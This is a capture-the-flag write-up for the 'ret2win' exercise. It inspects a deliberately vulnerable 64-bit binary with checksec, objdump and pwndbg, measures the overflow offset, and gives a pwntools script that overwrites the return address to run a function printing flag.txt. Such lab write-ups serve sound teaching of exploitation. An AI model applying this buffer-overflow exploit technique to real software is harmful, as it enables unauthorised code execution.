First of all, use checksec to get some binary information
```shell
[marco@marco-pc Downloads]$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a871295b6234edb261710bcc73a8c03e3c0f601d, not stripped
[marco@marco-pc Downloads]$ checksec --file=ret2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No	0		3	ret2win

```

The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
```shell
objdump -t ret2win
...
00000000004007b5 l     F .text	000000000000005c              pwnme
0000000000400811 l     F .text	0000000000000020              ret2win
...
```

There are 2 interesting functions:
- pwnme, which is called from main, print some strings and get an input;
- ret2win perfom a system comand "cat flag.txt"
```gdb
pwndbg> disassemble ret2win 
Dump of assembler code for function ret2win:
   0x0000000000400811 <+0>:	push   rbp
   0x0000000000400812 <+1>:	mov    rbp,rsp
   0x0000000000400815 <+4>:	mov    edi,0x4009e0
   0x000000000040081a <+9>:	mov    eax,0x0
   0x000000000040081f <+14>:	call   0x4005f0 <printf@plt>
   0x0000000000400824 <+19>:	mov    edi,0x4009fd
   0x0000000000400829 <+24>:	call   0x4005e0 <system@plt>
   0x000000000040082e <+29>:	nop
   0x000000000040082f <+30>:	pop    rbp
   0x0000000000400830 <+31>:	ret    
End of assembler dump.
pwndbg> x/s 0x4009fd
0x4009fd:	"/bin/cat flag.txt"
```

With a buffer overflow we can control the RIP and then we can jump in the ret2win funciton.
Let's find out how many bytes we need to fill until RIP
```gdb
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

...
For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
...

RBP  0x6161616a61616169 ('iaaajaaa')

...

pwndbg> cyclic -l 'iaaa'
32
```

32 byte to RBP ( +8 to RIP = 40 ). Final exploit:
```python
#!/usr/bin/python3

import struct
from pwn import *

ret2win_addr = 0x0000000000400811

shellcode = ("A"*40).encode()
shellcode += struct.pack("<Q", ret2win_addr)
 
p = process('./ret2win')
 
p.recvuntil('>')
p.sendline(shellcode)
print(p.recvall())
```
